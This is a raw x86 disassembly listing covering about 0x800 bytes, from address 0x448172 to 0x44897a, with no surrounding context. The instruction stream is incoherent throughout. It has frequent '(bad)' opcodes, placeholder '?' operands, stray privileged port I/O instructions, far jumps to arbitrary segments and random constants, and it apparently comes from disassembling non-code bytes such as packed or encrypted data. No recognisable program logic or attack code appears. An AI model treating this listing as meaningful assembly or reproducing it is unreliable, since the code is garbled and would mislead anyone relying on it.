  448172:	mov    BYTE PTR [ebp+0x48],bh
  448175:	popa   
  448176:	jb     0x448198
  448178:	mov    ds:0x229c33e3,al
  44817d:	mov    ecx,0x852caeee
  448182:	ds test ah,dh
  448185:	push   ebx
  448186:	jg     0x4481fb
  448188:	dec    ebp
  448189:	popa   
  44818a:	dec    ebp
  44818b:	aas    
  44818c:	cmp    bh,BYTE PTR [edx]
  44818e:	mov    ds:0x17562cd,al
  448193:	sub    DWORD PTR [eax+ebp*4-0x12f75ea1],ebx
  44819a:	cmp    esp,ebp
  44819c:	dec    ebx
  44819d:	and    ecx,edx
  44819f:	mov    al,ds:0x370bd7a5
  4481a4:	ror    DWORD PTR [eax+eiz*1+0x6f],cl
  4481a8:	pop    esi
  4481a9:	push   eax
  4481aa:	repz jl 0x4481c4
  4481ad:	and    eax,0x3760c2c4
  4481b3:	fistp  WORD PTR [ebx+eax*4+0x6eaf421]
  4481ba:	out    dx,al
  4481bb:	addr16 leave 
  4481bd:	js     0x4481ee
  4481bf:	sub    edx,esi
  4481c1:	fdivr  st,st(2)
  4481c3:	sahf   
  4481c4:	rcr    DWORD PTR [edi+0x1b9ebe52],0x4b
  4481cb:	push   cs
  4481cc:	cmp    al,0xa9
  4481ce:	bound  ecx,QWORD PTR [edi+0x4c]
  4481d1:	and    al,bh
  4481d3:	adc    ecx,DWORD PTR [edx-0x77]
  4481d6:	(bad)  
  4481d7:	sahf   
  4481d8:	(bad)  
  4481d9:	jge    0x4481d2
  4481db:	push   cs
  4481dc:	arpl   WORD PTR [esi+0x2983018d],bp
  4481e2:	ret    
  4481e3:	daa    
  4481e4:	jbe    0x44824c
  4481e6:	cmp    ebx,DWORD PTR ds:0x38484a78
  4481ec:	push   esi
  4481ed:	popa   
  4481ee:	jg     0x448207
  4481f0:	dec    ebx
  4481f1:	cld    
  4481f2:	in     eax,0x0
  4481f4:	pop    esi
  4481f5:	push   esp
  4481f6:	sbb    BYTE PTR [ebx],dl
  4481f8:	jbe    0x448279
  4481fa:	add    al,0x21
  4481fc:	sub    eax,0xef2e1460
  448201:	jle    0x448266
  448203:	sbb    eax,0x78aa915c
  448208:	pop    esi
  448209:	jne    0x4481f2
  44820b:	fisubr WORD PTR [edx+0x52b4f2e9]
  448211:	push   0x9144838c
  448216:	and    DWORD PTR [ecx+0x5a8d9904],esp
  44821c:	lock int 0xee
  44821f:	adc    edx,eax
  448221:	cmp    ah,bh
  448223:	les    ecx,FWORD PTR [esi]
  448225:	adc    al,0x99
  448227:	mov    eax,ds:0x96fbc6b9
  44822c:	jbe    0x4481cd
  44822e:	sbb    BYTE PTR [eax+0x5b],0x8f
  448232:	xor    cl,BYTE PTR [edx-0x1]
  448235:	stc    
  448236:	into   
  448237:	sahf   
  448238:	cmp    al,0xe0
  44823a:	or     eax,0x626a1abe
  44823f:	popf   
  448240:	arpl   WORD PTR [edx+0x3986c161],bx
  448246:	in     al,dx
  448247:	push   ss
  448248:	inc    eax
  448249:	popa   
  44824a:	imul   esi,edi,0xfcc8a8ce
  448250:	add    eax,0x7e63eed2
  448255:	mov    al,BYTE PTR gs:[ebp-0x5f2ed993]
  44825c:	inc    edi
  44825d:	push   0xffffff91
  44825f:	xor    esp,eax
  448261:	jns    0x448279
  448263:	inc    edi
  448264:	xchg   BYTE PTR ds:0xe07f2826,ch
  44826a:	outs   dx,BYTE PTR ds:[esi]
  44826b:	push   es
  44826c:	dec    esi
  44826d:	jb     0x4482ac
  44826f:	pop    ecx
  448270:	xchg   ecx,eax
  448271:	pusha  
  448272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448273:	or     dl,bl
  448275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448276:	xchg   BYTE PTR [ebp+edx*8-0x6b],dl
  44827a:	out    dx,al
  44827b:	shr    DWORD PTR [ebx-0x713b740c],0x99
  448282:	cmp    al,0xa8
  448284:	jo     0x44829f
  448286:	jbe    0x44824e
  448288:	ins    DWORD PTR es:[edi],dx
  448289:	sbb    edi,edi
  44828b:	jno    0x448247
  44828d:	or     eax,DWORD PTR [ecx]
  44828f:	dec    ebp
  448290:	(bad)  
  448291:	cmp    BYTE PTR [ebx],ah
  448293:	pusha  
  448294:	xchg   ecx,eax
  448295:	pusha  
  448296:	int3   
  448297:	dec    ebx
  448298:	lock cmp eax,0x61202f27
  44829e:	sub    edx,DWORD PTR [ebp-0x11833725]
  4482a4:	sbb    BYTE PTR [ebx+0x8],ch
  4482a7:	sub    ah,0x6e
  4482aa:	out    dx,al
  4482ab:	loope  0x448287
  4482ad:	test   BYTE PTR [ebp-0x79],ah
  4482b0:	mov    ds:0xca6c0660,al
  4482b5:	shl    cl,1
  4482b7:	jbe    0x448250
  4482b9:	(bad)  
  4482ba:	out    0xa3,eax
  4482bc:	(bad)  
  4482bd:	cld    
  4482be:	adc    eax,0x9e0a0bd5
  4482c3:	aam    0x88
  4482c5:	jnp    0x4482fc
  4482c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4482c8:	(bad)  
  4482c9:	rcl    DWORD PTR [edi],1
  4482cb:	outs   dx,BYTE PTR ds:[esi]
  4482cc:	sbb    esp,ebx
  4482ce:	mov    ds:0x675698a1,eax
  4482d3:	or     edx,DWORD PTR ds:0xae4aedd0
  4482d9:	sar    cl,cl
  4482db:	jle    0x44830c
  4482dd:	inc    esp
  4482de:	xor    DWORD PTR [ebp-0x5f37677e],edx
  4482e4:	xchg   ebx,eax
  4482e5:	adc    al,0xca
  4482e7:	es mov bh,0x34
  4482ea:	mov    ch,0x7b
  4482ec:	pop    esi
  4482ed:	mov    dl,0xb1
  4482ef:	inc    ebp
  4482f0:	in     eax,dx
  4482f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4482f2:	sub    DWORD PTR [ebx+0x68765e2b],ebp
  4482f8:	add    edi,ecx
  4482fa:	int3   
  4482fb:	in     eax,0xc6
  4482fd:	ficomp DWORD PTR [esi]
  4482ff:	and    BYTE PTR [ecx+0x18],bl
  448302:	pushf  
  448303:	es inc ebp
  448305:	inc    ebx
  448306:	cs jb  0x448365
  448309:	and    BYTE PTR gs:[ecx+0x493896ba],0x5b
  448311:	(bad)  
  448312:	shl    bl,1
  448314:	push   0x77
  448316:	out    dx,al
  448317:	sahf   
  448318:	repnz cs mov ebx,0x4d7f9a89
  44831f:	test   al,0x30
  448321:	in     eax,0x99
  448323:	fild   QWORD PTR [edi]
  448325:	adc    DWORD PTR [esi],edi
  448327:	ins    BYTE PTR es:[edi],dx
  448328:	add    esi,DWORD PTR cs:[edx+0x406328a8]
  44832f:	mov    eax,ds:0x597cbe1e
  448334:	jge    0x44839c
  448336:	mov    esp,DWORD PTR [esp+ecx*4-0x3816360d]
  44833d:	fild   DWORD PTR [esi-0x1179ef31]
  448343:	dec    esi
  448344:	clc    
  448345:	sbb    BYTE PTR [ecx-0x19],ah
  448348:	add    BYTE PTR [eax],0x2e
  44834b:	mov    ds:0xd8abba1,al
  448350:	jge    0x448397
  448352:	rcl    DWORD PTR [eax+0x68],0x71
  448356:	jmp    0x24fca5b3
  44835b:	rcr    BYTE PTR [esi-0x1828e73b],1
  448361:	popa   
  448362:	fimul  DWORD PTR ds:0xfda27d68
  448368:	mov    eax,0xf90b1559
  44836d:	adc    ah,al
  44836f:	js     0x448346
  448371:	jmp    0x33ee:0x7d9801ff
  448378:	data16 int3 
  44837a:	mov    esi,0xe5f7354
  44837f:	loope  0x4483b0
  448381:	xor    ah,BYTE PTR ds:0xac1613d
  448387:	adc    bl,BYTE PTR [esi+0x7c]
  44838a:	mov    ecx,0xc2d53498
  44838f:	mov    edi,fs
  448391:	pusha  
  448392:	dec    esp
  448393:	xchg   esi,eax
  448394:	arpl   WORD PTR [ebp+0x58],bp
  448397:	xchg   ebp,eax
  448398:	ret    
  448399:	cmp    BYTE PTR [edx],cl
  44839b:	mov    bh,0xf5
  44839d:	inc    esp
  44839e:	in     eax,dx
  44839f:	ret    0xffdc
  4483a2:	(bad)  
  4483a4:	(bad)  
  4483a5:	xor    ah,BYTE PTR gs:[ecx-0x4f9296ac]
  4483ac:	(bad)  
  4483ad:	mov    al,ds:0xc6842649
  4483b2:	out    dx,al
  4483b3:	retf   
  4483b4:	push   0x704fd3eb
  4483b9:	(bad)  
  4483ba:	xor    esp,DWORD PTR [ecx-0x4737560]
  4483c0:	test   DWORD PTR [edx-0x58],ecx
  4483c3:	cmp    al,0x5e
  4483c5:	mov    edx,0xb17f76a6
  4483ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4483cb:	rcl    BYTE PTR [edx-0x18f3bba0],0xe0
  4483d2:	sub    eax,0x16931dd
  4483d7:	xlat   BYTE PTR ds:[ebx]
  4483d8:	push   esp
  4483d9:	inc    eax
  4483da:	jmp    0x448366
  4483dc:	xor    al,0x32
  4483de:	shr    BYTE PTR [eax],cl
  4483e0:	add    al,0xc7
  4483e2:	jge    0x448385
  4483e4:	in     eax,dx
  4483e5:	psadbw mm7,mm0
  4483e8:	loopne 0x44837f
  4483ea:	aaa    
  4483eb:	rcr    DWORD PTR [edi-0x18],cl
  4483ee:	jg     0x4483b6
  4483f0:	test   ebp,ecx
  4483f2:	adc    BYTE PTR [ecx],ah
  4483f4:	sahf   
  4483f5:	(bad)  
  4483f6:	dec    ecx
  4483f7:	mov    eax,ds:0x74119b9c
  4483fc:	inc    ebx
  4483fd:	pop    ds
  4483fe:	in     al,dx
  4483ff:	jmp    0x44845e
  448401:	imul   ebp,DWORD PTR [edx],0xd6768300
  448407:	mov    bh,BYTE PTR [esi]
  448409:	and    BYTE PTR [eax-0x72a0535f],ah
  44840f:	ret    
  448410:	adc    ebp,DWORD PTR [edx+0x5f]
  448413:	scas   al,BYTE PTR es:[edi]
  448414:	outs   dx,DWORD PTR ds:[si]
  448416:	push   edx
  448417:	leave  
  448418:	mov    fs,eax
  44841a:	dec    ecx
  44841b:	cli    
  44841c:	cs push ecx
  44841e:	sub    al,0xa1
  448420:	push   ebx
  448421:	nop
  448422:	or     eax,0xb6d07cb7
  448427:	addr16 pop esi
  448429:	leave  
  44842a:	outs   dx,DWORD PTR ds:[esi]
  44842b:	test   eax,0xcf6ac17a
  448430:	pop    edx
  448431:	popa   
  448432:	sbb    al,0xc1
  448434:	and    eax,0xe6a73b59
  448439:	(bad)  
  44843b:	sub    eax,0x5101fce5
  448440:	adc    ebp,edx
  448442:	data16 lods al,BYTE PTR ds:[esi]
  448444:	sub    BYTE PTR ds:0xa9fb0eee,ah
  44844a:	xchg   esp,eax
  44844b:	push   ebx
  44844c:	pop    ebx
  44844d:	pop    ecx
  44844e:	out    dx,al
  44844f:	imul   edx,DWORD PTR [esi+ebx*4+0x71982fca],0x584ba110
  44845a:	data16 ficom WORD PTR [edx-0x54]
  44845e:	stos   DWORD PTR es:[edi],eax
  44845f:	ins    DWORD PTR es:[edi],dx
  448460:	pop    edi
  448461:	xchg   edi,eax
  448462:	lock dec esi
  448464:	mov    ebx,0x1460b3ad
  448469:	shr    BYTE PTR [esi-0x7b9f6bd8],0x89
  448470:	pusha  
  448471:	(bad)  [edi-0x1174aa8e]
  448477:	pop    ds
  448478:	jp     0x4484cd
  44847a:	adc    al,0xe5
  44847c:	aaa    
  44847d:	ret    0x9eef
  448480:	in     eax,dx
  448481:	xchg   esi,eax
  448482:	jle    0x4484e1
  448484:	ds mov edx,0x9ac47f11
  44848a:	out    dx,al
  44848b:	mov    al,0x6b
  44848d:	xlat   BYTE PTR ds:[ebx]
  44848e:	call   0x21a1e1b6
  448493:	xchg   edi,eax
  448494:	fld    DWORD PTR [ebx+edx*1+0x1961392d]
  44849b:	(bad)  
  44849c:	xchg   ebp,eax
  44849d:	cmp    DWORD PTR [esi+0x62],ebx
  4484a0:	ja     0x4484d1
  4484a2:	popf   
  4484a3:	scas   al,BYTE PTR es:[edi]
  4484a4:	push   ebx
  4484a5:	inc    ecx
  4484a6:	out    dx,al
  4484a7:	mov    ds:0xac3ff82c,al
  4484ac:	(bad)  
  4484ad:	sbb    ebp,esi
  4484af:	clc    
  4484b0:	lahf   
  4484b1:	imul   edi,DWORD PTR [edx],0xab3cddbe
  4484b7:	test   BYTE PTR [ecx+0x5e],ch
  4484ba:	jnp    0x4484d7
  4484bc:	xor    BYTE PTR [ecx],al
  4484be:	push   es
  4484bf:	stos   BYTE PTR es:[edi],al
  4484c0:	push   ds
  4484c1:	repz push ebx
  4484c3:	je     0x448523
  4484c5:	retf   
  4484c6:	ins    DWORD PTR es:[edi],dx
  4484c7:	push   edi
  4484c8:	stc    
  4484c9:	xchg   DWORD PTR [edi-0x3b],esp
  4484cc:	adc    dl,BYTE PTR [ebx-0x31]
  4484cf:	std    
  4484d0:	xchg   bh,ah
  4484d2:	push   cs
  4484d3:	sbb    eax,0x30035c0
  4484d8:	pop    ecx
  4484d9:	fadd   st,st(6)
  4484db:	ins    BYTE PTR es:[edi],dx
  4484dc:	fdivr  QWORD PTR [esi+ebp*1+0x2b]
  4484e0:	fild   DWORD PTR [edx-0x9295ef8]
  4484e6:	imul   edi,DWORD PTR [edx+0x47f69e6b],0x5e
  4484ed:	sti    
  4484ee:	enter  0xba4a,0x44
  4484f2:	sub    DWORD PTR [esi+0x329e51f3],esp
  4484f8:	je     0x44852f
  4484fa:	outs   dx,BYTE PTR ds:[esi]
  4484fb:	jne    0x448539
  4484fd:	sar    DWORD PTR [esi-0x15],cl
  448500:	pop    ebp
  448501:	lods   al,BYTE PTR ds:[esi]
  448502:	push   ecx
  448503:	sbb    ecx,DWORD PTR [ebp-0x4e]
  448506:	or     al,BYTE PTR [esi+edi*1+0xea16fd0]
  44850d:	jb     0x44858e
  44850f:	pushf  
  448510:	fdiv   st,st(0)
  448512:	jnp    0x44849d
  448514:	pop    esi
  448515:	sub    esi,DWORD PTR [ebx+0x28]
  448518:	xlat   BYTE PTR ds:[ebx]
  448519:	das    
  44851a:	lahf   
  44851b:	xchg   ebx,eax
  44851c:	inc    edx
  44851d:	and    eax,0xa982a176
  448522:	add    BYTE PTR [edi-0x5c047954],al
  448528:	add    BYTE PTR [ecx-0x4a],dh
  44852b:	dec    esp
  44852c:	xchg   DWORD PTR [eax+0x79],eax
  44852f:	stc    
  448530:	in     al,dx
  448531:	pusha  
  448532:	mov    eax,0x3821e483
  448537:	xor    al,0x2b
  448539:	or     eax,0x11ff7ee
  44853e:	inc    ebx
  44853f:	(bad)  [edx-0x7d5ea486]
  448545:	dec    edx
  448546:	add    eax,0x7c4e0471
  44854b:	xlat   BYTE PTR ds:[ebx]
  44854c:	pusha  
  44854d:	xchg   edi,eax
  44854e:	mov    esi,0x9f2f5bee
  448553:	add    DWORD PTR ds:0xd39c12bc,0xdef83b76
  44855d:	cmp    eax,0xb2571b0a
  448562:	add    BYTE PTR [ebx-0x67dec8c7],ah
  448568:	out    0xb0,al
  44856a:	out    dx,al
  44856b:	loope  0x44851b
  44856d:	leave  
  44856e:	jecxz  0x4485d6
  448570:	ins    BYTE PTR es:[edi],dx
  448571:	pusha  
  448572:	cmp    al,0x80
  448574:	add    eax,0x3024881b
  448579:	add    BYTE PTR fs:[edx+edi*1-0x9efd0b4],al
  448581:	pop    edi
  448582:	retf   
  448583:	jle    0x44856e
  448585:	pop    es
  448586:	sub    bh,dl
  448588:	mov    ebx,0xb0ea6360
  44858d:	stos   BYTE PTR es:[edi],al
  44858e:	and    eax,0xeeb85c0e
  448593:	xor    ebp,DWORD PTR [ebp+0x63]
  448596:	push   edx
  448597:	push   DWORD PTR [esi+0x61ed1d0c]
  44859d:	popa   
  44859e:	ins    BYTE PTR es:[edi],dx
  44859f:	or     ebx,DWORD PTR [ecx+0x71]
  4485a2:	addr16 aam 0xc1
  4485a5:	shr    dh,cl
  4485a7:	pop    edx
  4485a8:	dec    eax
  4485a9:	xor    ecx,DWORD PTR [esi-0x472ab649]
  4485af:	mov    al,ds:0x89253542
  4485b4:	mov    esp,0x5e8c646e
  4485b9:	inc    eax
  4485ba:	(bad)  
  4485bb:	inc    ebx
  4485bc:	stc    
  4485bd:	in     al,0xd5
  4485bf:	add    BYTE PTR [ebp+0x61],0x2d
  4485c3:	mov    cl,0x88
  4485c5:	sbb    ebp,0x8
  4485c8:	cmp    al,ch
  4485ca:	and    esp,DWORD PTR [ecx+0x16]
  4485cd:	loope  0x4485ff
  4485cf:	xchg   esp,eax
  4485d0:	and    eax,0xa44b707
  4485d5:	popa   
  4485d6:	scas   al,BYTE PTR es:[edi]
  4485d7:	jo     0x4485b1
  4485d9:	jg     0x4485b9
  4485db:	fsubp  st(2),st
  4485dd:	int3   
  4485de:	in     al,dx
  4485df:	and    eax,DWORD PTR [edx-0x21]
  4485e2:	or     BYTE PTR [eax],ch
  4485e4:	xchg   ebp,eax
  4485e5:	frstor [ebp-0x32]
  4485e8:	adc    al,0x97
  4485ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4485eb:	and    ebp,edx
  4485ed:	iret   
  4485ee:	test   eax,0x2a6161f0
  4485f3:	rcr    BYTE PTR [edi],cl
  4485f5:	fwait
  4485f6:	pop    esi
  4485f7:	call   0xadd7:0x4dee898d
  4485fe:	jnp    0x44864a
  448600:	mov    ebp,0x61a0fc17
  448605:	adc    bh,BYTE PTR gs:[esp+edx*4+0x5e1b525b]
  44860d:	inc    eax
  44860e:	dec    esi
  44860f:	mov    eax,0x9a82cf8d
  448614:	pop    ebx
  448615:	push   ebx
  448616:	lods   eax,DWORD PTR ds:[esi]
  448617:	fsub   QWORD PTR [esi*8-0x79872193]
  44861e:	pop    es
  44861f:	adc    ah,0x80
  448622:	mov    BYTE PTR [edi+0x21746f31],dh
  448628:	jl     0x4485fe
  44862a:	test   eax,0x22266b8
  44862f:	cwde   
  448630:	or     eax,0xea17370
  448635:	dec    ebx
  448636:	push   0x73
  448638:	neg    DWORD PTR ds:0x3c88bdee
  44863e:	lea    esi,[eax]
  448640:	dec    eax
  448641:	daa    
  448642:	popf   
  448643:	(bad)  
  448644:	(bad)  
  448645:	jle    0x448638
  448647:	loopne 0x4485f2
  448649:	(bad)  
  44864a:	mov    dh,0x12
  44864c:	push   ds
  44864d:	cmp    ebp,esi
  44864f:	mov    cl,bh
  448651:	jno    0x448645
  448653:	cwde   
  448654:	fisubr DWORD PTR [edx-0xc]
  448657:	mov    al,ds:0xf4aa30d2
  44865c:	add    esi,DWORD PTR [edi-0x67befb8a]
  448662:	shl    esp,1
  448664:	fs popa 
  448666:	mov    dl,cl
  448668:	dec    ebx
  448669:	inc    eax
  44866a:	clc    
  44866b:	imul   ch
  44866d:	jg     0x44865d
  44866f:	aas    
  448670:	out    dx,al
  448671:	mov    WORD PTR [esp+eiz*2],?
  448674:	xor    al,0xbb
  448676:	dec    esp
  448677:	neg    BYTE PTR [ecx+0x61]
  44867a:	loop   0x4486b3
  44867c:	fidivr WORD PTR [ecx]
  44867e:	fs push ecx
  448680:	mov    dl,0x6f
  448682:	out    dx,al
  448683:	push   es
  448684:	jnp    0x44867f
  448686:	push   ecx
  448687:	lods   eax,DWORD PTR ds:[esi]
  448688:	(bad)  
  448689:	inc    ecx
  44868a:	mov    esp,DWORD PTR [ecx+0x5fa3edf4]
  448690:	aas    
  448691:	sti    
  448692:	sub    BYTE PTR [esi-0x2e3c77a2],al
  448698:	cld    
  448699:	jne    0x4486e7
  44869b:	adc    ebx,DWORD PTR [ebp+0x61]
  44869e:	sbb    ebp,DWORD PTR [edx+0x1acb9d2d]
  4486a4:	sub    bh,BYTE PTR [eax]
  4486a6:	out    dx,al
  4486a7:	(bad)  
  4486a8:	cmp    ebx,DWORD PTR [ecx-0x74]
  4486ab:	shl    ah,1
  4486ad:	in     al,dx
  4486ae:	repnz sahf 
  4486b0:	add    bh,BYTE PTR [eax+0x77]
  4486b3:	fidivr DWORD PTR [esi]
  4486b5:	jbe    0x448659
  4486b7:	push   edi
  4486b8:	dec    eax
  4486b9:	es out dx,al
  4486bb:	or     eax,0xd3f9a395
  4486c0:	not    BYTE PTR [eax+0x73]
  4486c3:	mov    ds:0x75fc6c0d,al
  4486c8:	std    
  4486c9:	inc    esi
  4486ca:	cmp    cl,BYTE PTR [esi+0x62]
  4486cd:	inc    ecx
  4486ce:	pop    es
  4486cf:	push   edx
  4486d0:	pop    esi
  4486d1:	inc    ebp
  4486d2:	xchg   ecx,eax
  4486d3:	push   esi
  4486d4:	mov    edi,0xf88fc40a
  4486d9:	push   edx
  4486da:	ins    BYTE PTR es:[edi],dx
  4486db:	rcl    ah,1
  4486dd:	retf   0xc20e
  4486e0:	inc    eax
  4486e1:	or     eax,0x2b5e2faa
  4486e6:	dec    ecx
  4486e7:	sub    ebx,DWORD PTR [eax+ebp*8+0x4532a36b]
  4486ee:	cmp    eax,0xde9fc403
  4486f3:	les    eax,FWORD PTR [ecx]
  4486f5:	shl    DWORD PTR [ecx-0x1179618b],cl
  4486fb:	shr    DWORD PTR [ebx-0x23],0x7c
  4486ff:	and    BYTE PTR [esi+ecx*2+0x611d835a],bl
  448706:	mov    edi,DWORD PTR [ebp-0x2e]
  448709:	shl    BYTE PTR [ebx-0x18d755cd],1
  44870f:	sbb    BYTE PTR [edi+0x38],dh
  448712:	std    
  448713:	in     al,dx
  448714:	sahf   
  448715:	int3   
  448716:	(bad)  
  448717:	jmp    0xf8bc:0x7dba60c0
  44871e:	bound  ebx,QWORD PTR [esi+0x23]
  448721:	and    esi,ebp
  448723:	add    edx,DWORD PTR [ebx+ebp*2-0x5d]
  448727:	and    al,0xe2
  448729:	xchg   edi,eax
  44872a:	clc    
  44872b:	mov    al,ds:0x9b49409c
  448730:	pop    ecx
  448731:	mov    ebx,ebp
  448733:	add    DWORD PTR [eax+ebp*2+0x25426dee],eax
  44873a:	cmp    BYTE PTR [ecx-0x5f2e2d56],dh
  448740:	xor    al,0x9f
  448742:	add    ebp,DWORD PTR [esi]
  448744:	jmp    0xeed4:0x72801c55
  44874b:	icebp  
  44874c:	add    BYTE PTR [eax-0x13],0xca
  448750:	sub    al,cl
  448752:	test   al,0x8e
  448754:	gs push ebx
  448756:	pop    ss
  448757:	mov    eax,ds:0x56eff8ec
  44875c:	dec    edi
  44875d:	add    eax,0x245e3a5c
  448762:	in     al,0xdc
  448764:	cmp    al,0x72
  448766:	and    ebp,DWORD PTR [eax-0x56559eba]
  44876c:	mov    ecx,0x75ad6ed6
  448771:	out    0xee,al
  448773:	inc    eax
  448774:	imul   eax,DWORD PTR [edi-0x40],0xffffff84
  448778:	test   eax,0xc6a15849
  44877d:	push   0x4039b2c2
  448782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448783:	not    BYTE PTR [esp+esi*4-0x35]
  448787:	push   ebp
  448788:	pop    esi
  448789:	jns    0x4487be
  44878b:	jbe    0x4487e8
  44878d:	jno    0x44878b
  44878f:	mov    al,ds:0xd86ad1dd
  448794:	push   edx
  448795:	inc    esi
  448796:	or     al,0x68
  448798:	arpl   bx,ax
  44879a:	(bad)  
  44879b:	jo     0x448793
  44879d:	std    
  44879e:	iret   
  44879f:	mov    dh,0xe
  4487a1:	jmp    0x5869ffbf
  4487a6:	bound  eax,QWORD PTR [edx]
  4487a8:	mov    ds:0xf5a0ee82,eax
  4487ad:	aad    0x80
  4487af:	in     eax,0x5e
  4487b1:	lea    ebp,[ecx]
  4487b3:	imul   esi,edi,0xe3776420
  4487b9:	pusha  
  4487ba:	and    BYTE PTR [eax+0x29371ddf],ah
  4487c0:	cs mov esi,ebp
  4487c3:	xchg   BYTE PTR [edi*4+0x3d4a780f],al
  4487ca:	shl    BYTE PTR [ebp+0x7a],cl
  4487cd:	test   DWORD PTR [eax-0x5f],0x44164e74
  4487d4:	sti    
  4487d5:	jnp    0x448850
  4487d7:	jp     0x448837
  4487d9:	fisttp QWORD PTR [ebp+0xd394e6b]
  4487df:	imul   ebx,DWORD PTR [edx+0x60],0x7036aa20
  4487e6:	cmp    esi,DWORD PTR [ecx+0x40]
  4487e9:	mov    eax,ds:0xc25e6341
  4487ee:	imul   ebx,DWORD PTR cs:[ecx],0x42
  4487f2:	add    al,0x6
  4487f4:	lds    esp,FWORD PTR [eax-0x52]
  4487f7:	cld    
  4487f8:	addr16 sub ch,al
  4487fb:	mov    edi,0x1cee9686
  448800:	xor    DWORD PTR [ebx+0x5dcfaa3a],ecx
  448806:	mul    BYTE PTR [edi-0x37222a33]
  44880c:	call   0xdf4667ca
  448811:	sbb    ebx,DWORD PTR [ebx-0x113cb1a7]
  448817:	adc    BYTE PTR [edx],dl
  448819:	dec    ebp
  44881a:	push   esi
  44881b:	cli    
  44881c:	outs   dx,DWORD PTR ds:[esi]
  44881d:	out    dx,al
  44881e:	in     al,dx
  44881f:	mov    al,ds:0xc9366414
  448824:	xor    BYTE PTR cs:[ebp-0x1f14a1e0],al
  44882b:	xlat   BYTE PTR ds:[ebx]
  44882c:	pop    esp
  44882d:	and    dl,BYTE PTR [esi-0x8cff8f2]
  448833:	mov    al,ds:0x76393899
  448838:	jmp    0x44883b
  44883a:	xchg   ebp,eax
  44883b:	ja     0x44886f
  44883d:	rcr    DWORD PTR [esi],0x98
  448840:	loope  0x448885
  448842:	out    dx,al
  448843:	jnp    0x448824
  448845:	pop    esp
  448846:	inc    ebx
  448847:	dec    bh
  448849:	pop    ecx
  44884a:	jge    0x4487ff
  44884c:	mov    bl,0xbb
  44884e:	and    al,0xd1
  448850:	mov    cs,WORD PTR ds:0xcf5ee7cf
  448856:	rcr    DWORD PTR [esi-0x7c39bd1f],cl
  44885c:	bound  eax,QWORD PTR [esp+eax*2+0x4c]
  448860:	fldenv [eax-0x7d]
  448863:	shr    DWORD PTR [edi-0x15],cl
  448866:	out    0xd0,eax
  448868:	pop    esi
  448869:	jg     0x44881d
  44886b:	cmp    bh,cl
  44886d:	mov    bh,0x8d
  44886f:	mov    bh,0x41
  448871:	popa   
  448872:	(bad)  
  448873:	xor    BYTE PTR [edx-0x5e],ch
  448876:	iret   
  448877:	js     0x4488e5
  448879:	cdq    
  44887a:	and    DWORD PTR [ebx],eax
  44887c:	es pop esi
  44887e:	fiadd  WORD PTR [ebx+0x2a]
  448881:	pop    edi
  448882:	int    0x12
  448884:	sahf   
  448885:	mov    al,ds:0x60e7e165
  44888a:	inc    ebp
  44888b:	les    esp,FWORD PTR [ebx+0x2b]
  44888e:	clc    
  44888f:	sub    bl,BYTE PTR [edi]
  448891:	dec    ebp
  448892:	jmp    FWORD PTR [ecx+0x5c2e1691]
  448898:	(bad)  
  44889a:	call   0x747b:0x4b6094eb
  4488a1:	arpl   WORD PTR [esi],di
  4488a3:	cwde   
  4488a4:	rol    DWORD PTR [eax+0x55ac81eb],cl
  4488aa:	call   DWORD PTR [edx]
  4488ac:	loopne 0x44884e
  4488ae:	xchg   edi,eax
  4488af:	das    
  4488b0:	shl    BYTE PTR [edx-0x34],0x1a
  4488b4:	fisub  WORD PTR ds:0x9b0a0283
  4488ba:	mov    bh,0x87
  4488bc:	arpl   bx,bp
  4488be:	cmc    
  4488bf:	jecxz  0x448909
  4488c1:	popa   
  4488c2:	mov    cl,0xcf
  4488c4:	cmp    eax,0xdea3bc8c
  4488c9:	mov    ?,WORD PTR [eax+ebp*8+0xe6ef80b]
  4488d0:	pop    ss
  4488d1:	push   edx
  4488d2:	repz sub DWORD PTR [ebx],0xfba16f2c
  4488d9:	jg     0x448915
  4488db:	inc    edx
  4488dc:	(bad)  [eax-0x1]
  4488df:	mov    eax,cs:0x3347196c
  4488e5:	pop    ss
  4488e6:	out    dx,al
  4488e7:	gs pop edx
  4488e9:	or     esi,DWORD PTR [ebp+0x2bad4da3]
  4488ef:	mov    eax,ds:0xc94dd6e9
  4488f4:	mov    WORD PTR [edx-0x6f],?
  4488f7:	push   0x5e
  4488f9:	das    
  4488fa:	or     DWORD PTR [edi-0x9],eax
  4488fd:	test   al,0xe9
  4488ff:	std    
  448900:	fistp  DWORD PTR [ecx-0x52]
  448903:	add    DWORD PTR [ecx+0x48bd0491],esi
  448909:	sub    dh,ch
  44890b:	add    al,bl
  44890d:	push   0x335f7d2b
  448912:	or     DWORD PTR [ecx+0x4a435e6a],esp
  448918:	call   0x9938:0x643a9691
  44891f:	stos   DWORD PTR es:[edi],eax
  448920:	lods   eax,DWORD PTR ds:[esi]
  448921:	pusha  
  448922:	cmp    BYTE PTR [edx],dl
  448924:	(bad)  
  448925:	sbb    DWORD PTR ds:[ecx+0x44467dd6],esp
  44892c:	and    esp,DWORD PTR [esi-0x49]
  44892f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448930:	pop    edx
  448931:	retf   0xf403
  448934:	jge    0x4488b8
  448936:	ins    DWORD PTR es:[edi],dx
  448937:	mov    dl,BYTE PTR [eax+0x3a3de8d]
  44893d:	pusha  
  44893e:	mov    cl,0xb7
  448940:	fadd   QWORD PTR ds:0xc0d0e354
  448946:	ficomp WORD PTR [edx]
  448948:	pop    esi
  448949:	or     edi,esp
  44894b:	mov    edx,0xfb0f6b94
  448950:	mul    DWORD PTR [eax-0x1c]
  448953:	lds    ebp,FWORD PTR [ebp+0x0]
  448956:	push   esi
  448957:	gs inc esi
  448959:	in     eax,0xe4
  44895b:	jge    0x4489c9
  44895d:	sbb    al,0xee
  44895f:	rol    cl,1
  448961:	outs   dx,BYTE PTR ds:[esi]
  448962:	mov    esp,0x22cd52e9
  448967:	mov    ds:0xf6a6eb0a,al
  44896c:	mov    dl,0x30
  44896e:	test   eax,0xf0a35360
  448973:	dec    edi
  448974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448975:	xor    DWORD PTR [esi],esi
  448977:	and    DWORD PTR [edi-0x2b],ebp
  44897a:	xor    dh,bh
